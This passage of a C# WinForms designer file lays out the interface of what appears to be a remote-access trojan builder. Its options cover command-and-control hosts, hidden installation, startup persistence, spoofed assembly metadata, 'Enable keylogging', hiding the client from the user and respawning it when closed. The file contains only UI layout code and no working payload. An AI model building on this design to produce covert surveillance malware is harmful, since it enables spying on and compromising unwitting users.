            // LBL_InstallSubdirectory
            // 
            this.LBL_InstallSubdirectory.AutoSize = true;
            this.LBL_InstallSubdirectory.Location = new System.Drawing.Point(9, 138);
            this.LBL_InstallSubdirectory.Name = "LBL_InstallSubdirectory";
            this.LBL_InstallSubdirectory.Size = new System.Drawing.Size(130, 17);
            this.LBL_InstallSubdirectory.TabIndex = 5;
            this.LBL_InstallSubdirectory.Text = "Install subdirectory:";
            // 
            // RB_System
            // 
            this.RB_System.AutoSize = true;
            this.RB_System.Enabled = false;
            this.RB_System.Location = new System.Drawing.Point(354, 108);
            this.RB_System.Name = "RB_System";
            this.RB_System.Size = new System.Drawing.Size(75, 21);
            this.RB_System.TabIndex = 4;
            this.RB_System.TabStop = true;
            this.RB_System.Text = "System";
            this.RB_System.UseVisualStyleBackColor = true;
            // 
            // RB_ProgramFiles
            // 
            this.RB_ProgramFiles.AutoSize = true;
            this.RB_ProgramFiles.Enabled = false;
            this.RB_ProgramFiles.ImageAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.RB_ProgramFiles.Location = new System.Drawing.Point(354, 81);
            this.RB_ProgramFiles.Name = "RB_ProgramFiles";
            this.RB_ProgramFiles.Size = new System.Drawing.Size(116, 21);
            this.RB_ProgramFiles.TabIndex = 3;
            this.RB_ProgramFiles.TabStop = true;
            this.RB_ProgramFiles.Text = "Program Files";
            this.RB_ProgramFiles.UseVisualStyleBackColor = true;
            // 
            // RB_UserAppData
            // 
            this.RB_UserAppData.AutoSize = true;
            this.RB_UserAppData.Enabled = false;
            this.RB_UserAppData.Location = new System.Drawing.Point(354, 54);
            this.RB_UserAppData.Name = "RB_UserAppData";
            this.RB_UserAppData.Size = new System.Drawing.Size(166, 21);
            this.RB_UserAppData.TabIndex = 2;
            this.RB_UserAppData.TabStop = true;
            this.RB_UserAppData.Text = "User Application Data";
            this.RB_UserAppData.UseVisualStyleBackColor = true;
            // 
            // LBL_InstallDirectory
            // 
            this.LBL_InstallDirectory.AutoSize = true;
            this.LBL_InstallDirectory.Location = new System.Drawing.Point(6, 54);
            this.LBL_InstallDirectory.Name = "LBL_InstallDirectory";
            this.LBL_InstallDirectory.Size = new System.Drawing.Size(107, 17);
            this.LBL_InstallDirectory.TabIndex = 1;
            this.LBL_InstallDirectory.Text = "Install directory:";
            // 
            // CB_InstallClient
            // 
            this.CB_InstallClient.AutoSize = true;
            this.CB_InstallClient.Location = new System.Drawing.Point(6, 30);
            this.CB_InstallClient.Name = "CB_InstallClient";
            this.CB_InstallClient.Size = new System.Drawing.Size(103, 21);
            this.CB_InstallClient.TabIndex = 0;
            this.CB_InstallClient.Text = "Install client";
            this.CB_InstallClient.UseVisualStyleBackColor = true;
            this.CB_InstallClient.CheckedChanged += new System.EventHandler(this.CB_InstallClient_CheckedChanged);
            // 
            // TP_AssemblySettings
            // 
            this.TP_AssemblySettings.Controls.Add(this.GB_AssemblyInformation);
            this.TP_AssemblySettings.Location = new System.Drawing.Point(140, 4);
            this.TP_AssemblySettings.Name = "TP_AssemblySettings";
            this.TP_AssemblySettings.Padding = new System.Windows.Forms.Padding(3);
            this.TP_AssemblySettings.Size = new System.Drawing.Size(629, 358);
            this.TP_AssemblySettings.TabIndex = 3;
            this.TP_AssemblySettings.Text = "Assembly";
            this.TP_AssemblySettings.UseVisualStyleBackColor = true;
            // 
            // TP_SurveillanceSettings
            // 
            this.TP_SurveillanceSettings.Controls.Add(this.GB_Serveillance);
            this.TP_SurveillanceSettings.Location = new System.Drawing.Point(140, 4);
            this.TP_SurveillanceSettings.Name = "TP_SurveillanceSettings";
            this.TP_SurveillanceSettings.Size = new System.Drawing.Size(629, 358);
            this.TP_SurveillanceSettings.TabIndex = 4;
            this.TP_SurveillanceSettings.Text = "Surveillance";
            this.TP_SurveillanceSettings.UseVisualStyleBackColor = true;
            // 
            // GB_AssemblyInformation
            // 
            this.GB_AssemblyInformation.Controls.Add(this.TB_FileName);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_FileVersion);
            this.GB_AssemblyInformation.Controls.Add(this.TB_ProductVersion);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_ProductVersion);
            this.GB_AssemblyInformation.Controls.Add(this.TB_OriginalFilename);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_OriginalFilename);
            this.GB_AssemblyInformation.Controls.Add(this.TB_Trademarks);
            this.GB_AssemblyInformation.Controls.Add(this.TB_Copyright);
            this.GB_AssemblyInformation.Controls.Add(this.TB_CompanyName);
            this.GB_AssemblyInformation.Controls.Add(this.TB_Description);
            this.GB_AssemblyInformation.Controls.Add(this.TB_ProductName);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_TradeMarks);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_Copyright);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_CompanyName);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_Description);
            this.GB_AssemblyInformation.Controls.Add(this.checkBox1);
            this.GB_AssemblyInformation.Controls.Add(this.LBL_ProductName);
            this.GB_AssemblyInformation.Location = new System.Drawing.Point(7, 7);
            this.GB_AssemblyInformation.Name = "GB_AssemblyInformation";
            this.GB_AssemblyInformation.Size = new System.Drawing.Size(603, 345);
            this.GB_AssemblyInformation.TabIndex = 0;
            this.GB_AssemblyInformation.TabStop = false;
            this.GB_AssemblyInformation.Text = "Assembly Information";
            // 
            // LBL_ProductName
            // 
            this.LBL_ProductName.AutoSize = true;
            this.LBL_ProductName.Location = new System.Drawing.Point(6, 99);
            this.LBL_ProductName.Name = "LBL_ProductName";
            this.LBL_ProductName.Size = new System.Drawing.Size(102, 17);
            this.LBL_ProductName.TabIndex = 0;
            this.LBL_ProductName.Text = "Product Name:";
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(9, 30);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(217, 21);
            this.checkBox1.TabIndex = 1;
            this.checkBox1.Text = "Change Assembly Information";
            this.checkBox1.UseVisualStyleBackColor = true;
            // 
            // LBL_Description
            // 
            this.LBL_Description.AutoSize = true;
            this.LBL_Description.Location = new System.Drawing.Point(6, 127);
            this.LBL_Description.Name = "LBL_Description";
            this.LBL_Description.Size = new System.Drawing.Size(83, 17);
            this.LBL_Description.TabIndex = 2;
            this.LBL_Description.Text = "Description:";
            // 
            // LBL_CompanyName
            // 
            this.LBL_CompanyName.AutoSize = true;
            this.LBL_CompanyName.Location = new System.Drawing.Point(6, 155);
            this.LBL_CompanyName.Name = "LBL_CompanyName";
            this.LBL_CompanyName.Size = new System.Drawing.Size(112, 17);
            this.LBL_CompanyName.TabIndex = 3;
            this.LBL_CompanyName.Text = "Company Name:";
            // 
            // LBL_Copyright
            // 
            this.LBL_Copyright.AutoSize = true;
            this.LBL_Copyright.Location = new System.Drawing.Point(6, 183);
            this.LBL_Copyright.Name = "LBL_Copyright";
            this.LBL_Copyright.Size = new System.Drawing.Size(72, 17);
            this.LBL_Copyright.TabIndex = 4;
            this.LBL_Copyright.Text = "Copyright:";
            // 
            // LBL_TradeMarks
            // 
            this.LBL_TradeMarks.AutoSize = true;
            this.LBL_TradeMarks.Location = new System.Drawing.Point(6, 211);
            this.LBL_TradeMarks.Name = "LBL_TradeMarks";
            this.LBL_TradeMarks.Size = new System.Drawing.Size(88, 17);
            this.LBL_TradeMarks.TabIndex = 5;
            this.LBL_TradeMarks.Text = "Trademarks:";
            // 
            // TB_ProductName
            // 
            this.TB_ProductName.Location = new System.Drawing.Point(238, 99);
            this.TB_ProductName.Name = "TB_ProductName";
            this.TB_ProductName.Size = new System.Drawing.Size(269, 22);
            this.TB_ProductName.TabIndex = 6;
            // 
            // TB_Description
            // 
            this.TB_Description.Location = new System.Drawing.Point(238, 127);
            this.TB_Description.Name = "TB_Description";
            this.TB_Description.Size = new System.Drawing.Size(269, 22);
            this.TB_Description.TabIndex = 7;
            // 
            // TB_CompanyName
            // 
            this.TB_CompanyName.Location = new System.Drawing.Point(238, 155);
            this.TB_CompanyName.Name = "TB_CompanyName";
            this.TB_CompanyName.Size = new System.Drawing.Size(269, 22);
            this.TB_CompanyName.TabIndex = 8;
            // 
            // TB_Copyright
            // 
            this.TB_Copyright.Location = new System.Drawing.Point(238, 183);
            this.TB_Copyright.Name = "TB_Copyright";
            this.TB_Copyright.Size = new System.Drawing.Size(269, 22);
            this.TB_Copyright.TabIndex = 9;
            // 
            // TB_Trademarks
            // 
            this.TB_Trademarks.Location = new System.Drawing.Point(238, 211);
            this.TB_Trademarks.Name = "TB_Trademarks";
            this.TB_Trademarks.Size = new System.Drawing.Size(269, 22);
            this.TB_Trademarks.TabIndex = 10;
            // 
            // LBL_OriginalFilename
            // 
            this.LBL_OriginalFilename.AutoSize = true;
            this.LBL_OriginalFilename.Location = new System.Drawing.Point(6, 242);
            this.LBL_OriginalFilename.Name = "LBL_OriginalFilename";
            this.LBL_OriginalFilename.Size = new System.Drawing.Size(122, 17);
            this.LBL_OriginalFilename.TabIndex = 11;
            this.LBL_OriginalFilename.Text = "Original Filename:";
            // 
            // TB_OriginalFilename
            // 
            this.TB_OriginalFilename.Location = new System.Drawing.Point(238, 242);
            this.TB_OriginalFilename.Name = "TB_OriginalFilename";
            this.TB_OriginalFilename.Size = new System.Drawing.Size(269, 22);
            this.TB_OriginalFilename.TabIndex = 12;
            // 
            // TB_FileName
            // 
            this.TB_FileName.Location = new System.Drawing.Point(238, 301);
            this.TB_FileName.Name = "TB_FileName";
            this.TB_FileName.Size = new System.Drawing.Size(269, 22);
            this.TB_FileName.TabIndex = 16;
            // 
            // LBL_FileVersion
            // 
            this.LBL_FileVersion.AutoSize = true;
            this.LBL_FileVersion.Location = new System.Drawing.Point(6, 301);
            this.LBL_FileVersion.Name = "LBL_FileVersion";
            this.LBL_FileVersion.Size = new System.Drawing.Size(86, 17);
            this.LBL_FileVersion.TabIndex = 15;
            this.LBL_FileVersion.Text = "File Version:";
            // 
            // TB_ProductVersion
            // 
            this.TB_ProductVersion.Location = new System.Drawing.Point(238, 270);
            this.TB_ProductVersion.Name = "TB_ProductVersion";
            this.TB_ProductVersion.Size = new System.Drawing.Size(269, 22);
            this.TB_ProductVersion.TabIndex = 14;
            // 
            // LBL_ProductVersion
            // 
            this.LBL_ProductVersion.AutoSize = true;
            this.LBL_ProductVersion.Location = new System.Drawing.Point(6, 270);
            this.LBL_ProductVersion.Name = "LBL_ProductVersion";
            this.LBL_ProductVersion.Size = new System.Drawing.Size(113, 17);
            this.LBL_ProductVersion.TabIndex = 13;
            this.LBL_ProductVersion.Text = "Product Version:";
            // 
            // GB_Serveillance
            // 
            this.GB_Serveillance.Controls.Add(this.checkBox2);
            this.GB_Serveillance.Location = new System.Drawing.Point(4, 4);
            this.GB_Serveillance.Name = "GB_Serveillance";
            this.GB_Serveillance.Size = new System.Drawing.Size(619, 351);
            this.GB_Serveillance.TabIndex = 0;
            this.GB_Serveillance.TabStop = false;
            this.GB_Serveillance.Text = "Surveillance";
            // 
            // checkBox2
            // 
            this.checkBox2.AutoSize = true;
            this.checkBox2.Location = new System.Drawing.Point(6, 37);
            this.checkBox2.Name = "checkBox2";
            this.checkBox2.Size = new System.Drawing.Size(146, 21);
            this.checkBox2.TabIndex = 0;
            this.checkBox2.Text = "Enable keylogging";
            this.checkBox2.UseVisualStyleBackColor = true;
            // 
            // TP_Miscellaneous
            // 
            this.TP_Miscellaneous.Controls.Add(this.groupBox1);
            this.TP_Miscellaneous.Location = new System.Drawing.Point(140, 4);
            this.TP_Miscellaneous.Name = "TP_Miscellaneous";
            this.TP_Miscellaneous.Size = new System.Drawing.Size(629, 358);
            this.TP_Miscellaneous.TabIndex = 5;
            this.TP_Miscellaneous.Text = "Miscellaneous";
            this.TP_Miscellaneous.UseVisualStyleBackColor = true;
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.CB_RespawnIfClosed);
            this.groupBox1.Controls.Add(this.CB_HideClientFromUser);
            this.groupBox1.Location = new System.Drawing.Point(3, 3);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(620, 352);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Miscellaneous";
            // 
            // CB_HideClientFromUser
            // 
            this.CB_HideClientFromUser.AutoSize = true;
            this.CB_HideClientFromUser.Location = new System.Drawing.Point(7, 22);
            this.CB_HideClientFromUser.Name = "CB_HideClientFromUser";
            this.CB_HideClientFromUser.Size = new System.Drawing.Size(160, 21);
            this.CB_HideClientFromUser.TabIndex = 0;
            this.CB_HideClientFromUser.Text = "Hide client from user";
            this.CB_HideClientFromUser.UseVisualStyleBackColor = true;
            // 
            // CB_RespawnIfClosed
            // 
            this.CB_RespawnIfClosed.AutoSize = true;
            this.CB_RespawnIfClosed.Location = new System.Drawing.Point(7, 49);
            this.CB_RespawnIfClosed.Name = "CB_RespawnIfClosed";
            this.CB_RespawnIfClosed.Size = new System.Drawing.Size(207, 21);
            this.CB_RespawnIfClosed.TabIndex = 1;
            this.CB_RespawnIfClosed.Text = "Respawn client when closed";
            this.CB_RespawnIfClosed.UseVisualStyleBackColor = true;
            // 
            // BuilderForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(797, 423);
            this.Controls.Add(this.BTN_BuildClient);
            this.Controls.Add(this.TC_Builder);
            this.Name = "BuilderForm";
            this.ShowIcon = false;
            this.Text = "BuilderForm";
            this.Load += new System.EventHandler(this.BuilderForm_Load);
            this.CMS_LB_ConnectionHosts.ResumeLayout(false);
            this.TC_Builder.ResumeLayout(false);
            this.TP_BasicSettings.ResumeLayout(false);
            this.GB_RandomMutex.ResumeLayout(false);
            this.GB_RandomMutex.PerformLayout();
            this.GB_ClientTag.ResumeLayout(false);
            this.GB_ClientTag.PerformLayout();
            this.TP_ConnectionSettings.ResumeLayout(false);
            this.GB_ReconnectionDelay.ResumeLayout(false);
            this.GB_ReconnectionDelay.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NUD_WaitInbetweenReconnectionTries)).EndInit();
            this.GB_EncryptedConnection.ResumeLayout(false);
            this.GB_EncryptedConnection.PerformLayout();
            this.GB_ConnectionHosts.ResumeLayout(false);
            this.GB_ConnectionHosts.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NUD_Port)).EndInit();
            this.TP_Installation.ResumeLayout(false);
            this.GB_AddToStartUp.ResumeLayout(false);
            this.GB_AddToStartUp.PerformLayout();
            this.GB_InstallationLocation.ResumeLayout(false);
            this.GB_InstallationLocation.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PB_UAC2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PB_UAC)).EndInit();
            this.TP_AssemblySettings.ResumeLayout(false);
            this.TP_SurveillanceSettings.ResumeLayout(false);
            this.GB_AssemblyInformation.ResumeLayout(false);
            this.GB_AssemblyInformation.PerformLayout();
            this.GB_Serveillance.ResumeLayout(false);
            this.GB_Serveillance.PerformLayout();
            this.TP_Miscellaneous.ResumeLayout(false);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private Controls.DotNetBarTabControl TC_Builder;
        private System.Windows.Forms.TabPage TP_BasicSettings;
        private System.Windows.Forms.TabPage TP_ConnectionSettings;
        private System.Windows.Forms.TabPage TP_Installation;
        private System.Windows.Forms.TabPage TP_AssemblySettings;
        private System.Windows.Forms.GroupBox GB_RandomMutex;
        private System.Windows.Forms.Button BTN_RandomMutexGenerator;
        private System.Windows.Forms.TextBox TB_RandomMutex;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label LBL_UniqueMutex;
        private System.Windows.Forms.GroupBox GB_ClientTag;
        private System.Windows.Forms.TextBox TB_ClientTag;
        private System.Windows.Forms.Label LBL_ClientTag;
        private System.Windows.Forms.Label LBL_ATagSoYouCanIndenitfyYourClient;
        private System.Windows.Forms.TabPage TP_SurveillanceSettings;
        private System.Windows.Forms.GroupBox GB_ConnectionHosts;
        private System.Windows.Forms.TextBox TB_IPHostname;
        private System.Windows.Forms.NumericUpDown NUD_Port;
        private System.Windows.Forms.Label LBL_Port;
        private System.Windows.Forms.Label LBL_IPHostname;
        private System.Windows.Forms.ListBox LB_ConnectionHosts;
        private System.Windows.Forms.Button BTN_BuildClient;
        private System.Windows.Forms.ContextMenuStrip CMS_LB_ConnectionHosts;
        private System.Windows.Forms.ToolStripMenuItem TSMI_Remove;
        private System.Windows.Forms.ToolStripMenuItem TMSI_Clear;
        private System.Windows.Forms.Button BTN_AddHost;
        private System.Windows.Forms.GroupBox GB_EncryptedConnection;
        private System.Windows.Forms.Label LBL_EncryptedConnection;
        private System.Windows.Forms.CheckBox CB_ShowPassword;
        private System.Windows.Forms.TextBox TB_EncryptedPassword;
        private System.Windows.Forms.Label LBL_PasswordForEncryptedConnection;
        private System.Windows.Forms.GroupBox GB_ReconnectionDelay;
        private System.Windows.Forms.Label LBL_WaitInbetweenReconnectTries;
        private System.Windows.Forms.Label LBL_ms;
        private System.Windows.Forms.NumericUpDown NUD_WaitInbetweenReconnectionTries;
        private System.Windows.Forms.GroupBox GB_InstallationLocation;
        private System.Windows.Forms.Label LBL_InstallDirectory;
        private System.Windows.Forms.CheckBox CB_InstallClient;
        private System.Windows.Forms.RadioButton RB_System;
        private System.Windows.Forms.RadioButton RB_ProgramFiles;
        private System.Windows.Forms.RadioButton RB_UserAppData;
        private System.Windows.Forms.CheckBox CB_SetSubDirectoryToHidden;
        private System.Windows.Forms.CheckBox CB_SetFileAttributeHidden;
        private System.Windows.Forms.Label LBL_Exe;
        private System.Windows.Forms.TextBox TB_Name;
        private System.Windows.Forms.TextBox TB_SubDirectory;
        private System.Windows.Forms.Label LBL_Name;
        private System.Windows.Forms.Label LBL_InstallSubdirectory;
        private System.Windows.Forms.GroupBox GB_AddToStartUp;
        private System.Windows.Forms.TextBox TB_StartUpName;
        private System.Windows.Forms.Label LBL_StartUpName;
        private System.Windows.Forms.CheckBox CB_StartWhenWindowsStarts;
        private System.Windows.Forms.PictureBox PB_UAC2;
        private System.Windows.Forms.PictureBox PB_UAC;
        private System.Windows.Forms.GroupBox GB_AssemblyInformation;
        private System.Windows.Forms.Label LBL_ProductName;
        private System.Windows.Forms.TextBox TB_OriginalFilename;
        private System.Windows.Forms.Label LBL_OriginalFilename;
        private System.Windows.Forms.TextBox TB_Trademarks;
        private System.Windows.Forms.TextBox TB_Copyright;
        private System.Windows.Forms.TextBox TB_CompanyName;
        private System.Windows.Forms.TextBox TB_Description;
        private System.Windows.Forms.TextBox TB_ProductName;
        private System.Windows.Forms.Label LBL_TradeMarks;
        private System.Windows.Forms.Label LBL_Copyright;
        private System.Windows.Forms.Label LBL_CompanyName;
        private System.Windows.Forms.Label LBL_Description;
        private System.Windows.Forms.CheckBox checkBox1;
        private System.Windows.Forms.TextBox TB_FileName;
        private System.Windows.Forms.Label LBL_FileVersion;
        private System.Windows.Forms.TextBox TB_ProductVersion;
        private System.Windows.Forms.Label LBL_ProductVersion;
        private System.Windows.Forms.GroupBox GB_Serveillance;
        private System.Windows.Forms.CheckBox checkBox2;
        private System.Windows.Forms.TabPage TP_Miscellaneous;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.CheckBox CB_RespawnIfClosed;
        private System.Windows.Forms.CheckBox CB_HideClientFromUser;
    }
}